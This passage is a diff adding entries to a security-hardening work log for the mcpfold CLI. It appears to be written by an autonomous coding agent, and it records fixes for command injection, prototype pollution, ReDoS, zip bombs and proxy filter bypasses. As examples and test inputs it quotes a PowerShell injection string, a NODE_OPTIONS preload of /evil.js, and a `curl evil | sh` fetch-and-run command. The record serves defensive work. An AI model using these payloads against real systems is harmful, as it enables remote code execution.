@@ -1187,3 +1187,570 @@ build clean.
 **Follow-ups:** per-team IdP selection (this ships deployment-level OIDC config, not per-team) and a
 web view of the audit-event log (the `team-events` endpoint exists; the console shows config-version
 audit today).
+
+## S22.1 — Fix PowerShell command injection in the Windows keychain provider
+
+Started/done: 2026-07-11. BLOCKER security fix. The win32 keychain provider built its PowerShell
+`-Command` string by interpolating the untrusted `account` (and `service`) straight into a
+single-quoted `Get-StoredCredential -Target '${service}:${account}'`. A `${keychain:...}` ref such
+as `${keychain:x'); Start-Process calc; ('}` closed the quote and executed injected statements —
+reachable via a tampered/synced config even on an otherwise-trusted server, since env-channel refs
+aren't behind the TOFU gate and secrets resolve at run/test time.
+
+**Fix (out-of-band, injection-proof by construction).** The win32 `-Command` script is now a
+CONSTANT that reads the target from env vars: `Get-StoredCredential -Target ($env:MCPFOLD_KC_SERVICE
++ ':' + $env:MCPFOLD_KC_ACCOUNT)`. PowerShell treats env values as opaque string data (never parsed
+as code), so the account/service never enter the command text. `keychainCommand` gained an optional
+`env` field; the provider threads it through `exec`, and `defaultExec`/`ExecOptions` grew an `env`
+option that merges over `process.env` for the child (undefined on POSIX, which already passed the
+account as an argv element). Added `-NonInteractive` so a malformed value can never block on a prompt.
+
+**Defense in depth (AC #4).** Tightened core `SECRET_REF_RE` (schema.ts) so a ref path forbids
+shell/quote metacharacters — quotes, backtick, `$`, `;`, parentheses, braces, backslash, whitespace
+— rejecting an injection payload at schema-validation time. Regenerated the committed
+`packages/schema/mcp.config.schema.json` (the `token` pattern) to match.
+
+Tests: win32 argv is a constant regardless of account; an injection-laden account carries no trace
+into the executed argv (only into env) and runs exactly one command; a normal account still resolves
+on win32 (behavior parity). `verify_all` green — lint, typecheck, full suite (secrets 39, core 92,
+schema 9, adapters 151, proxy 54, cli 283, e2e, security), and build all pass.
+
+**Follow-ups:** unify the two secret-ref grammars — `secret-ref.ts`'s loose parsing regexes
+(`WHOLE_REF_RE`/`EMBEDDED_REF_RE`) still accept the broader path; converging them with the tightened
+`SECRET_REF_RE` is S22.22's scope. The provider is injection-proof independent of that regex.
+
+## S22.2 — Merge into shared-state client files instead of overwriting them
+
+Started/done: 2026-07-11. BLOCKER (data loss). `mcpfold sync` read the target file and passed it as
+`existing` to `adapter.render`, but the shared `createMcpServersAdapter` factory and the custom
+gemini-cli/vscode renders ignored it and emitted a full replacement. Since claude-code user scope is
+`~/.claude.json` (Claude Code's ENTIRE user state — OAuth account, project history, numStartups), zed
+is `~/.config/zed/settings.json` (all editor settings), and gemini-cli is `~/.gemini/settings.json`
+(auth type, theme), the first sync destroyed every non-MCP key. claude_desktop_config.json can also
+hold non-MCP keys (globalShortcut).
+
+**Fix.** New `mergeManagedKeys(existing, keys)` helper in shared.ts does a jsonc-parser
+`modify`/`applyEdits` structural edit — replacing only the mcpfold-owned root key(s) and preserving
+every other top-level key plus comments/formatting (the same technique opencode/goose/codex already
+used). The shared factory (Cursor, Claude Code, Claude Desktop, Zed, + all other mcpServers-style
+clients), gemini-cli (`mcpServers`), and vscode (`servers` + `inputs`) now render through it.
+
+**Idempotency.** `sync` decides "unchanged" by byte identity, so first-write and re-fold must use the
+same formatter. Rather than a split serialize-vs-merge path (which drifted on the second sync), every
+render now always goes through `mergeManagedKeys` (from `{}` when there's no existing file) — and
+jsonc-parser `modify` is a fixed point on its own output, so a second sync is byte-identical and
+reports `unchanged`. Servers are sorted by name for deterministic output; entry fields are emitted in
+construction order (regenerated the 21 mcpServers-style fixture snapshots + the shared.test.ts inline
+golden accordingly).
+
+Tests: per-adapter round-trips seeded with real-world extra keys survive a write — claude-code
+(numStartups/oauthAccount/projects), zed (theme/buffer_font_size + comments), gemini-cli
+(selectedAuthType/theme), vscode ($schema/custom + comments), claude-desktop (globalShortcut); plus a
+claude-code idempotence check. `verify_all` green — lint, typecheck, full suite (adapters 158,
+cli 283, core, secrets, schema, proxy, e2e, security), and build.
+
+**Follow-ups:** none required for the DoD. VS Code's `inputs` array is treated as fully
+mcpfold-managed (replaced wholesale) — a user's hand-authored non-mcpfold input would not survive,
+but that matches the prior full-replace behavior and no such case is known.
+
+## S22.3 — Reject __proto__/constructor keys in the core config parser
+
+Started/done: 2026-07-11. HIGH (schema bypass, verified at runtime). `nodeToValue` (load.ts)
+reconstructed objects with `obj[key] = …`, so a `__proto__` key invoked the prototype setter instead
+of creating an own property. A document whose whole body was nested under `__proto__` loaded as
+`ok:true` with zero own keys — the `.strict()` schema fully bypassed and any real servers/profiles
+there silently vanished. `detectVersion` read `version` through the prototype chain, and a server
+literally named `__proto__` corrupted the servers record.
+
+**Fix.** `loadConfig` now walks the parsed JSONC tree (`findProtoPollutionKey`) for any literal
+`__proto__`/`constructor`/`prototype` property key BEFORE reconstruction/validation and returns a
+positioned `schema` error (line/column at the offending key). Defense in depth: `nodeToValue` builds
+objects with `Object.create(null)`, `serialize.ts` `sortKeysDeep` uses a null-proto accumulator, and
+the v1→v2 migration builds its servers record with `Object.create(null)` so a `__proto__`-named
+server can't pollute even if reached directly.
+
+Tests (load.test.ts): a `__proto__`-bodied document and a `__proto__`-named server both return
+`ok:false` with a `__proto__`-mentioning message; `constructor`/`prototype` keys anywhere are
+rejected; a normal config is unaffected and loads with a real (unpolluted) prototype. `verify_all`
+green — lint, typecheck, full suite (core 96, + all packages), and build; no false positives from the
+scan across the whole workspace.
+
+**Follow-ups:** the scan rejects these three keys anywhere, including inside free-form `env`/`headers`
+records — a pathological but theoretically-legitimate env var named `constructor` would be refused.
+Accepted as a security-over-flexibility tradeoff per the story's DoD.
+
+## S22.4 — Include env in the TOFU executable signature (NODE_OPTIONS/LD_PRELOAD)
+
+Started/done: 2026-07-11. HIGH (verified). `executableSignature` (trust/tofu.ts) hashed only
+command/args/pin, but `run` spawns the child with `{ ...process.env, ...server.env }`. env is a
+first-class code-execution channel — `NODE_OPTIONS=--require /evil.js` (any node/npx server),
+`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `PYTHONSTARTUP`/`PYTHONPATH`, `BROWSER`. Because env was
+outside the signed surface, a synced/tampered config could change a trusted server's env and it ran
+with no CHANGED / re-approve gate.
+
+**Fix.** `ExecutableEntry` gains `env`, and `executableSignature` now folds a canonicalized
+(key-sorted) form of env into the hash. env is threaded into every entry construction — the run gate
+(run.ts), the trust command (trust.ts), and `untrustedServers` (which pull.ts consumes). To preserve
+existing trust, env is only added to the hashed object when non-empty: an env-less server keeps its
+pre-S22.4 signature (still trusted after upgrade); a server that carries env re-gates once (env was
+previously unsigned — desired). We sign the config form of env (secret refs), not resolved values.
+
+Tests (trust.test.ts): adding `NODE_OPTIONS` to a previously-trusted server flips its status to
+`changed`; an env value change / env presence changes the signature while key-order does not; an
+empty/absent env is byte-identical to the old signature; and `run` refuses to spawn (CHANGED) a
+server whose pulled config added `NODE_OPTIONS`, with the spawner never called. `verify_all` green —
+lint, typecheck, full suite (cli 283 incl. 14 trust), and build.
+
+**Follow-ups:** none for the DoD. pull's auto-approve of pulled launch commands stays gated behind
+integrity verification (a signed config, or explicit --allow-unsigned), so a tampered unsigned config
+is refused rather than auto-trusted; the run-path re-gate is the enforcement point.
+
+## S22.5 — Back up the canonical config before pull --yes overwrites it
+
+Started/done: 2026-07-11. HIGH (data loss, verified). `pull` called
+`atomicWrite(target, serialize(remote.config))` with no prior `backupIfExists` — unlike every other
+canonical-config writer (`migrate.ts`, `sync.ts`, which both back up first). Since `restore` only
+enumerates client files via `adapter.resolvePath` per profile and never targets the canonical
+`mcp.config.jsonc`, a clobbered canonical config with uncommitted local edits was unrecoverable.
+
+**Fix.** `runPull` now calls `backupIfExists(target, …)` immediately before the `atomicWrite`,
+mirroring migrate/sync. The backup path is added to `PullData.backup` and surfaced in the human
+output ("Backed up the previous config to …"). The existing injectable `now` clock is reused for a
+deterministic backup timestamp. No-ops (backup `null`, no message) on a first-time pull with no local
+config.
+
+Tests (cloud.test.ts): a pull over a config carrying an uncommitted local edit writes a backup that
+preserves the ORIGINAL contents and surfaces its path; a first-time pull with no local config makes
+no backup. `verify_all` green — lint, typecheck, full suite (cli 283 incl. 20 cloud), and build.
+
+**Follow-ups:** AC #3 (teach `restore` to enumerate the canonical file so a pulled overwrite can be
+undone in-tool) is explicitly optional and was deferred — it needs a new non-profile target concept
+and selection UX. The backup itself uses the standard `.mcpfold.bak.` format and is manually
+restorable today; the DoD (never overwrite without a timestamped backup) is met.
+
+## S22.6 — Enforce recursion-depth limits in core traversals (parse/serialize/diff)
+
+Started/done: 2026-07-11. HIGH (DoS, verified). `nodeToValue` (load.ts), `sortKeysDeep` (serialize.ts),
+and diff's `semanticEqual` recurse once per nesting level with no cap. A config with ~200k nested
+brackets made `loadConfig` throw an uncaught `RangeError: Maximum call stack size exceeded`, violating
+the documented no-throw `LoadResult` contract.
+
+**Fix.** Empirically the overflow hits BEFORE reconstruction — `parseTree` itself recurses per level —
+so a catch after parsing is insufficient. `loadConfig` now runs `findExcessiveDepthOffset`, an O(n)
+iterative scan of the raw text (skipping string contents and line/block comments so their brackets
+don't count) that returns a positioned `ok:false` when structural nesting exceeds 64 levels, BEFORE
+`parseTree`. Defense in depth: `nodeToValue` carries a depth counter and throws a caught
+`MaxNestingError` (→ positioned `ok:false`), and `sortKeysDeep` is depth-capped (which transitively
+bounds diff's `semanticEqual`, since it compares through `serialize`). Also fixed a latent bug where
+`[].map(sortKeysDeep)`/`[].map(nodeToValue)` passed the array index as the depth arg.
+
+Tests (load.test.ts): 500-level input returns a positioned "too deep" error without throwing;
+~200k-level input returns `ok:false` and never throws a RangeError. `verify_all` green — lint,
+typecheck, full suite (core 98, + all packages), and build.
+
+**Follow-ups:** none. 64 is ~10× the deepest legitimate config path, so no real config is affected.
+
+## S22.7 — Keep loadConfig's no-throw contract for malformed version numbers
+
+Started/done: 2026-07-11. HIGH (verified). `loadConfig` called `migrateConfig(value, SCHEMA_VERSION)`
+with no try/catch whenever `detectVersion(value) < 2`. `detectVersion` reports any number verbatim
+(0, negatives, fractionals), and `migrateConfig` loops `while (current < target)` and throws
+`MigrationError` when no step has `from === current`. So version 0 and version 1.5 both threw uncaught,
+crashing doctor/sync which rely on the documented no-throw `LoadResult`.
+
+**Fix.** `loadConfig` now (1) rejects a non-integer or `< 1` version up front with a positioned
+`schema` error (path `version`), before any migration, and (2) wraps the `migrateConfig` call in a
+try/catch that converts a `MigrationError` into an `ok:false` positioned error — defense in depth for
+any future missing-step gap.
+
+Tests (load.test.ts): version 0, -1, and 1.5 each return `ok:false` (never throw) with a `version`
+path; a valid v1 config still auto-migrates to v2 and loads. `verify_all` green — lint, typecheck,
+full suite, and build.
+
+## S22.8 — Parse client configs tolerantly (JSONC) and never crash on malformed input
+
+Started/done: 2026-07-11. HIGH (verified). Every adapter `parse()` used `JSON.parse` with no
+try/catch (shared factory, gemini-cli, opencode, vscode). VS Code/Cursor `mcp.json`, Claude Code, and
+Roo/Cline settings are officially JSONC (comments + trailing commas), so `JSON.parse` threw an uncaught
+`SyntaxError` on a valid file — silently skipping its servers on import (import already try/catches per
+adapter) and crashing drift detection (`diffRendered` → `parser.parse`).
+
+**Fix.** New `parseClientJsonc` helper (shared.ts) uses jsonc-parser (`allowTrailingComma`, comments
+tolerated) and throws a single descriptive `Error` on genuinely malformed input; it replaces
+`JSON.parse` in the shared factory + gemini-cli/opencode/vscode parses. New `diffRenderedSafe` util
+wraps `diffRendered` at the two client-file drift sites (diff.ts, sync.ts) so a parse failure becomes a
+`UsageError` naming the offending file — parser-agnostic, so it also covers codex (TOML) / goose (YAML).
+`pull`'s diffRendered compares canonical-vs-canonical (mcpfold-produced JSON), so it is not a
+client-file crash surface and was left as-is.
+
+Tests: vscode parses a commented + trailing-comma file and throws `/malformed JSON/` (not a raw
+SyntaxError) on corruption; `runDiff` handles a JSONC on-disk cursor file and turns a corrupt one into a
+`UsageError` naming `.cursor/...`. `verify_all` green — lint, typecheck, full suite, and build.
+
+**Follow-ups:** import's per-adapter sweep still silently skips a corrupt file (graceful, no crash) —
+intentional so one broken client config doesn't abort discovery of all the others.
+
+## S22.9 — Wire package-integrity (SRI) verification end-to-end
+
+Started/done: 2026-07-11. MEDIUM (verified). `trust/integrity.ts` exported `verifyPackageIntegrity` /
+`computeIntegrity` but a grep showed they were never called — only `parseIntegrity`, and only to warn
+on malformed syntax. The supply-chain control was dead. Separately, `resolve.ts` `toResolved` never
+copied `server.integrity` onto `ResolvedServer` (the type lacked the field), so the hash couldn't reach
+a fetch/install layer even once verification was wired.
+
+**Fix.** (1) Propagation: `ResolvedServer` gains `integrity?` and `toResolved` sets it from
+`server.integrity`. (2) Enforcement: the `--from-mcpb` add path — the one place mcpfold fetches package
+bytes — now verifies the fetched bundle against the declared integrity via the shared
+`verifyPackageIntegrity` (accepting a registry `fileSha256` as hex or SRI via `toSri`), failing closed
+with a clear supply-chain error on a mismatch and a distinct error on a malformed hash. This replaces
+the ad-hoc `verifyMcpbIntegrity` call at the install site (the helper stays for its own unit tests).
+
+Tests: integrity survives resolution (resolve.test.ts); a matching hash installs, a mismatch refuses
+("integrity check failed"), and a malformed value errors ("not a valid …") — mcpb.test.ts.
+`verify_all` green — lint, typecheck, full suite, and build.
+
+**Follow-ups:** npm/pypi registry packages carry an `integrity` from the listing's `fileSha256`, but
+mcpfold doesn't fetch their tarballs (npm/uvx do at runtime), so their integrity is recorded for audit
+but not byte-verified here — the mcpb bundle path is where mcpfold actually holds the bytes.
+
+## S22.10 — Cap the proxy stdio read buffer and handle stream errors/close
+
+Started/done: 2026-07-11. HIGH + MEDIUM (verified). `streamTransport` (proxy stdio) did
+`buffer += chunk` and drained only up to the last newline, with NO maximum — a server (the untrusted
+party the proxy exists to contain) could stream gigabytes with no newline and the proxy accumulated it
+all (OOM). It also registered only `input.on('data')` — a stream error (EPIPE when the child dies)
+became an uncaught exception; `close()` only removed the data listener (never destroyed the stream),
+and residual bytes after the final newline were dropped on EOF.
+
+**Fix.** `streamTransport` gained a `maxLineBytes` cap (default 8 MiB): after draining complete lines,
+an unterminated remainder past the cap force-closes with an error. It now handles `error`/`end`/`close`
+on the input and `error` on the output, wraps `send()` writes in try/catch, and surfaces all of these
+through a new optional `MessageTransport.onClose(handler)` (error set on abnormal close, undefined on
+clean EOF). `close()` removes every listener and destroys the input stream. A final newline-less
+message is delivered on clean EOF instead of dropped. `connectProxy` wires `onClose` from both
+transports to a once-guarded disposer, so a crashing/flooding server tears the WHOLE session down
+cleanly.
+
+Tests (new proxy/test/stdio.test.ts): an over-cap unterminated flood closes with a "line cap" error and
+destroys the stream (bounded memory); a stream `error` surfaces via `onClose` without throwing;
+`close()` removes listeners + destroys; a trailing newline-less message is delivered on EOF; a
+server-side error tears down both sides via `connectProxy`. `verify_all` green — lint, typecheck, full
+suite (proxy 66), and build.
+
+## S22.11 — Validate registry-supplied runtime hints and remote URLs before writing configs
+
+Started/done: 2026-07-11. MEDIUM (security, verified). `runnerFor` (registry/map.ts) ended with
+`default: return pkg.runtimeHint ?? 'npx'` — `runtimeHint` is server-controlled data from `server.json`
+and flowed directly into `server.command` (the process the client spawns), with only the pinned
+package spec as args. A registry entry could set `runtimeHint` to an arbitrary command. `remote.url`
+was also written into client configs without checking it is https.
+
+**Fix.** Runners are now whitelisted through `RUNNER_WHITELIST` (npm/npx→npx, pypi/uvx→uvx,
+oci/docker→docker); any other `runtimeHint`/`registryType` throws a `UsageError` (with a hint to use
+`--from-mcpb` for bundles) rather than being spawned. `mapRemote` requires an `https://` URL before
+writing a remote endpoint into a client config.
+
+Tests (registry.test.ts): a hostile `runtimeHint` (`sh -c "curl evil | sh"`) and an unsupported
+registryType (`mcpb`) are rejected as unsupported runners; a non-https remote url is rejected. The
+prior mcpb-integrity test was retargeted to `npm` (the hex→SRI conversion is type-agnostic, and mcpb is
+no longer a mapped stdio runner). `verify_all` green — lint, typecheck, full suite, and build.
+
+**Follow-ups:** cargo/nuget/mcpb registry packages are now rejected by `--from-registry` (they never
+produced a working runner before — the command was the bogus literal type). mcpb listings should be
+installed via `add --from-mcpb`.
+
+## S22.12 — Close proxy tool-filter bypasses (notification-form call, alias/case)
+
+Started/done: 2026-07-11. MEDIUM (security, verified). Two bypasses of the curation proxy's tool
+deny/allow filter: (1) proxy.ts gated the `tools/call` rejection on `message.id !== undefined`, so a
+`tools/call` sent as a NOTIFICATION (no id) skipped `!isToolAllowed` and was forwarded to the server —
+a blocked tool executed fire-and-forget. (2) `isToolAllowed` used exact `list.includes(name)`, so a
+deny-listed tool the server also honors under a different case/whitespace spelling (`FOO`, `foo `)
+passed the filter.
+
+**Fix.** (1) The `tools/call` guard now runs whenever the method is `tools/call` regardless of id; a
+blocked request still gets an error response, and a blocked notification (no id to answer) is dropped —
+either way it never reaches the server. Audit `callStart` only records when there is an id. (2)
+`isToolAllowed` normalizes both the directive list and the queried name via `trim().toLowerCase()`, so
+the `tools/list` filter and the `tools/call` guard agree by construction and a case/whitespace variant
+is blocked.
+
+Tests: filter.test.ts covers case/whitespace normalization for allow + deny; passthrough.test.ts
+covers a notification-form denied call (not forwarded), a request-form denied call (error, not
+forwarded), a case/whitespace variant (blocked), and an allowed call still forwarding in both forms.
+`verify_all` green — lint, typecheck, full suite (proxy 68), and build.
+
+## S21.4 / S21.5 / S21.6 — BLOCKED (E21 web/marketing, autonomous sandbox limits)
+
+2026-07-11. These three E21 stories are blocked for autonomous completion in this environment; the
+loop moves past them to the completable E22 security backlog per the blocked-handling protocol.
+
+- **S21.4 (token-cost leaderboard)** requires COLLECTED (not estimated) tool-schema data — launching
+  each directory MCP server live via the proxy to capture `tools/list`. Many servers need credentials
+  and network/npm access that isn't available here, and the story explicitly warns that estimated or
+  fabricated numbers destroy the asset's credibility. Producing the leaderboard/JSON-LD/calculator
+  presets honestly needs a session with live-server + credential access. Not faking the data.
+- **S21.5 (web funnel instrumentation + channel attribution)** needs a production analytics backend
+  and attribution/config decisions (which provider, event taxonomy, consent) that are product/infra
+  calls, not autonomous code changes.
+- **S21.6 (e2e for the calculator + new comparison pages)** is coupled to the new pages S21.4 would
+  create; without them there is nothing new to e2e beyond the existing calculator.
+
+Unblock by running a focused session with live-server/credential access (S21.4), the site's analytics
+configuration (S21.5), then S21.6 once the new pages exist.
+
+## S22.13 — Bound proxy pending maps and validate the handshake protocol version
+
+Started/done: 2026-07-11. MEDIUM x2 (verified). Two unbounded/unvalidated spots in the proxy:
+(1) `pendingToolListing` (proxy.ts) and the audit `inflight` map (audit.ts) only shrank on a matching
+response, so a server that never replies — or replies with an error/non-tools result — leaked an entry
+per request, with no TTL or cap. (2) `handshake.ts` accepted `init.protocolVersion` unconditionally
+(`protocolSupported` was computed but never gated anything), sent `notifications/initialized` +
+`tools/list` regardless, and then echoed the attacker-chosen version as the `MCP-Protocol-Version`
+header on every later request; `init` could also be null.
+
+**Fix.** (1) The `tools/call`/`tools/list` tracking now evicts a tracked id on ANY response — only a
+genuine tools result is curated; an error/other result evicts and forwards unfiltered. The audit
+recorder gained a `maxInflight` cap (default 1024) that evicts the oldest tracked calls (Map insertion
+order) once exceeded. (2) The handshake validates that the `initialize` result is a non-null object
+(else `reachable:false`), and when the negotiated version is unsupported it returns
+`protocolSupported:false` with zero tools BEFORE sending `initialized`/`tools/list` or calling
+`setProtocolVersion` — so an unsupported version is never spoken or echoed as a header.
+
+Tests: audit evicts the oldest call past a cap of 2 (only the surviving id emits); handshake refuses an
+unsupported version (no tools/list, no header echo — `state.negotiated` stays undefined) and rejects a
+null initialize result as unreachable; the proxy forwards an error response to a tracked `tools/list`
+unchanged (id evicted, no leak). `verify_all` green — lint, typecheck, full suite (proxy 71), and build.
+
+## S22.14 — Pass the macOS session secret over stdin, not argv
+
+Started/done: 2026-07-11. MEDIUM (verified). The darwin `set` command in `cloud/token-store.ts` was
+`security add-generic-password -U -s mcpfold -a <account> -w <secret>` — placing the serialized
+CloudSession (both access and refresh tokens) directly in argv, where another local process could read
+it from `ps` while login ran. The module's Linux and Windows branches already fed the value over stdin;
+only macOS inlined it.
+
+**Fix.** The darwin `set` now uses a bare `-w` (no inline value) and supplies the secret via `stdin`
+(which `run()` already pipes and closes) — `security` reads the password from the piped stdin. This
+matches the Linux/Windows branches, so the secret never appears in argv on any platform.
+
+Tests (token-store.test.ts): the darwin set command carries the secret via `stdin`, its args do NOT
+contain the secret, and the final arg is a bare `-w`. `verify_all` green — lint, typecheck, full suite,
+and build.
+
+## S22.15 — Validate the cloud refresh response before persisting the session
+
+Started/done: 2026-07-11. MEDIUM (verified). `cloud/api.ts` `refresh` returned
+`(await res.json()) as RefreshResponse` with no shape check — unlike `pollDevice`, which validates
+tokens at the source (S16.6). `session.ts` then trusted it: `accessToken: refreshed.access_token`,
+`expiresAt: now + refreshed.expires_in`. A 200 missing `access_token`/`expires_in` yielded an undefined
+access token (dropped by JSON.stringify, so `loadSession` later returned null and silently logged the
+user out) and a `NaN` expiry (defeating the still-valid check, so every call re-refreshed).
+
+**Fix.** `refresh` now validates the body at the source, mirroring `pollDevice`: `access_token` must be
+a non-empty string and `expires_in` a finite number; `refresh_token` is optional (the server may not
+rotate it) but must be a non-empty string when present. A malformed 200 throws a clear
+"malformed session" error before `session.ts` can `saveSession`, so nothing corrupt is persisted.
+
+Tests (cloud.test.ts, new refresh-validation block): a well-formed 200 (rotated or not) returns the
+validated response; a 200 missing the access token, a non-finite `expires_in`, or an empty rotated
+refresh token each reject. `verify_all` green — lint, typecheck, full suite, and build.
+
+## S22.16 — Back up and atomically write on import --force, and re-validate the merged config
+
+Started/done: 2026-07-11. MEDIUM + LOW (verified). `commands/import.ts` used
+`writeFileSync(configPath, contents)` for the `--force` overwrite — no `backupIfExists`, not atomic,
+unlike migrate/sync/add. It also wrote without a `loadConfig` round-trip (add.ts/init.ts validate;
+import didn't), so a client file that parses into a shape the canonical schema rejects yielded an
+invalid `mcp.config.jsonc` on disk.
+
+**Fix.** Before writing, import now re-validates the serialized merge with `loadConfig` and throws a
+clear `UsageError` (nothing written) when it is invalid; it then calls `backupIfExists` (surfaced as
+`data.backup`) and routes the write through `atomicWrite`. `writeFileSync` is gone from the module.
+
+Tests (import.test.ts): `--force` backs up the old config first (backup path returned, contents
+preserved, one `.mcpfold.bak.` file) and writes a valid config; a client config that merges into a
+stdio server with an empty command is rejected ("would be invalid") and nothing is written.
+`verify_all` green — lint, typecheck, full suite, and build.
+
+## S22.17 — Make watchWithDebounce swallow onChange rejections (honor never-throws contract)
+
+Started/done: 2026-07-11. MEDIUM (verified). `io/watch.ts` invoked its async fold as `void fire()`
+(and re-invoked via `schedule()` in the finally re-run path). If `onChange` returned a rejected
+promise, `fire`'s promise rejected and — discarded with `void` — became an unhandled promise
+rejection, process-terminating on modern Node. The module's own doc promises the primitive never
+throws or dies; `runSyncWatch` happened to wrap its work in try/catch, but `watchWithDebounce` is a
+public export and the contract was unmet for any other caller.
+
+**Fix.** `fire` now wraps `await opts.onChange()` in try/catch (swallowing the rejection) so it can
+never escape as an unhandled rejection; the finally-based re-run/bookkeeping is unchanged. onChange
+errors remain the caller's to handle (as documented) — the primitive only guarantees the watch
+survives.
+
+Tests (watch.test.ts): a rejecting onChange registers no `unhandledRejection` and the watch keeps
+running (a second change still drives onChange). `verify_all` green — lint, typecheck, full suite,
+and build.
+
+## S22.18 — Add a request timeout and response/zip size limits to the registry client
+
+Started/done: 2026-07-11. MEDIUM + LOW (verified). `registry/client.ts` `fetchImpl(url, { headers })`
+set no AbortSignal/timeout, so a mirror that accepts the connection but never responds hung the CLI
+forever (contradicting the S0.9 fail-clearly contract). `res.json()` read an unbounded body, and
+`registry/mcpb.ts` `unzipSync` decompressed a `.mcpb` with no size/entry cap (fflate has no zip-bomb
+guard).
+
+**Fix.** (1) Registry fetches attach `AbortSignal.timeout` (15s default, injectable `timeoutMs`); a
+timeout/abort surfaces as the degraded-mode UsageError ("did not respond within …"). (2) A new
+`readBoundedJson` caps the response body (8 MiB default, injectable `maxResponseBytes`) — it meters a
+real streaming body chunk-by-chunk and aborts past the cap, falling back to `res.json()` for non-stream
+test mocks. (3) `parseMcpbManifest` now passes fflate a `filter` that runs per entry on metadata alone:
+it decompresses ONLY `manifest.json`, and only when its declared `originalSize` is within the cap
+(4 MiB), with an entry-count limit (10k) — so an oversized or many-entry zip bomb is rejected before
+any bytes inflate. Caps are injectable (`McpbLimits`) for tests.
+
+Tests: registry times out a non-responding mirror (signal-aware fetch + 20ms timeout) and rejects an
+oversized response body (real Response + 256-byte cap); mcpb reads a normal bundle, rejects a manifest
+past a tiny cap, and rejects a 2-entry archive with `maxEntries:1`. `verify_all` green — lint,
+typecheck, full suite, and build.
+
+## S22.19 — Fix policy package matching (segment boundary) and glob ReDoS
+
+Started/done: 2026-07-11. MEDIUM + LOW (verified). `policy.ts` matched a rule's `package` with
+`stripVersion(pkg).startsWith(rule.package) || pkg.startsWith(rule.package)` — a raw `startsWith` with
+no boundary, so a rule for `@modelcontextprotocol/server-git` matched `@modelcontextprotocol/server-github`
+and `foo` matched `foo-bar` (over/under-matching for a deny-wins control). And `globToRe` mapped each
+`*` to `.*` with no collapsing, so a `url` glob with `**` compiled to adjacent `.*.*` — catastrophic
+backtracking (ReDoS) against a long `server.url`.
+
+**Fix.** New `packageMatchesRule` requires a name boundary: exact versionless-spec equality, or the
+character after the prefix is `/` or `@` (so `server-git` no longer matches `server-github`, `foo` no
+longer matches `foo-bar`, while `foo@1.2.3` and sub-paths still match). `globToRe` collapses runs of
+`*` (`/\*+/g → *`) before compiling, so `**` becomes a single `.*` and evaluation is linear.
+
+Tests (policy.test.ts): a `server-git` rule matches `server-git` but not the sibling `server-github`;
+`foo` doesn't match `foo-bar` but matches `foo` and `foo@1.2.3`; and a `https://**...**` glob against a
+50k-char non-matching URL resolves in < 200ms (linear, not exponential). The prior test that asserted
+prefix over-matching was corrected to the boundary behavior. `verify_all` green — lint, typecheck, full
+suite, and build.
+
+**All E22 p2 stories (S22.13–S22.19) complete.**
+
+## S21.7 / S21.8 — BLOCKED (E21 marketing/growth, need product decisions + live measurement)
+
+2026-07-11. Like the S21.4-6 cluster, these two E21 p3 stories are blocked for autonomous completion;
+the loop moves on to the completable E22 p3 security backlog.
+
+- **S21.7 (homepage message A/B test)** explicitly requires running GEO/rank + SEO measurement for both
+  message clusters over a defined window and letting the DATA pick the H1 emphasis ("do NOT rewrite on
+  a hunch"). That needs live SEO-measurement infrastructure, a time window, and a maintainer copy
+  decision — not an autonomous code change.
+- **S21.8 (contributor growth loop)** needs product/marketing framing (which framing, which highest-demand
+  missing adapters), GitHub good-first-issue label curation (issue-management access), and ongoing,
+  visible contributor acknowledgment. The mechanical part (a `/community` on-ramp section) can't be done
+  faithfully without those product decisions and repo/social actions.
+
+Unblock with a focused product/marketing session (SEO tooling + copy decision for S21.7; framing +
+GitHub labels + acknowledgment plan for S21.8).
+
+## S22.20 — Harden atomicWrite (durability + symlink) and use it in export/init
+
+Started/done: 2026-07-11. LOW (verified). `io/atomic-write.ts` gave atomic content replacement but no
+fsync of the file or directory, so the documented crash-mid-write guarantee was weaker than stated (a
+power loss just after `renameSync` can lose the rename or leave a zero-length file). `renameSync` over
+a symlinked target replaced the link with a regular file, silently destroying a user's symlinked
+config. And `export.ts`/`init.ts` used bare `writeFileSync` (a torn read is possible when
+`export --force` overwrites a file another tool is reading).
+
+**Fix.** `atomicWrite` now opens the temp file, `fsync`s it before the rename, and `fsync`s the
+containing directory after (best-effort; no-op on win32 where a directory can't be opened as an fd),
+so the durability claim holds. It resolves the target with `realpathSync` first, so a symlinked config
+is FOLLOWED — the write goes to the link's real file and the symlink is preserved (documented in the
+module header). `export` and `init` now write via `atomicWrite`.
+
+Tests: atomic-write follows a symlinked target and preserves the link (real file gets the new content,
+no temp remnant); init `--force` writes through a symlinked config. Both symlink tests skip on win32
+(symlinkSync needs elevation there). `verify_all` green — lint, typecheck, full suite, and build.
+
+**Note:** all canonical-config writers (sync, pull, migrate, add, import, export, init) now go through
+the hardened atomicWrite.
+
+## S22.21 — Validate numeric CLI flags and harden dotenv secret set
+
+Started/done: 2026-07-11. LOW x2 (verified). `cli.ts` coerced `--limit` and `--config-version` with a
+bare `Number()` and never rejected NaN/negative/non-integer, forwarding garbage to the registry/cloud
+client (`--limit abc` → NaN; `--config-version 1.5` stayed non-integer). `commands/secret.ts` did
+`appendFileSync(envPath, ${path}=${value}\n, { mode: 0o600 })` unconditionally: `path`/`value` were
+unescaped (a newline injects extra `KEY=VALUE` lines), duplicate keys accumulated (last-wins masks
+stale values), and `mode 0o600` only applied on file CREATE — a pre-existing 0644 `.env` stayed
+world-readable.
+
+**Fix.** New exported `parseIntFlag(name, raw, {min})` rejects NaN/`< min`/non-integer with a
+`UsageError`; `--limit` and `--config-version` use it. New `upsertDotenv` rejects a newline (in key or
+value) or an `=` in the key, drops every existing assignment to the key before appending the fresh one
+(dedupe + upsert), and `chmodSync(0o600)` after writing on POSIX (tightening a pre-existing file).
+
+Tests: `parseIntFlag` accepts `20`/undefined and rejects `abc`/`-3`/`1.5`; dotenv upserts (one
+`TOKEN=` line, old value gone), preserves other keys, rejects a newline-injection value, and allows
+`=` in the value but not the key. `verify_all` green — lint, typecheck, full suite, and build.
+
+## S22.22 — Tighten redaction prefixes and unify the secret-ref grammar
+
+Started/done: 2026-07-11. LOW x2 (verified). `redact.ts` `KNOWN_TOKEN_RE` omitted GitHub fine-grained
+PATs (`github_pat_`) and Stripe secret keys (`sk_live_`/`sk_test_`; note `sk-` needs a hyphen, Stripe
+uses `_`), leaving them to the fragile high-entropy heuristic — while `refguard.ts` `RAW_SECRET` already
+covered `github_pat_`, so the two lists were inconsistent. And `secret-ref.ts` `WHOLE_REF_RE` used a
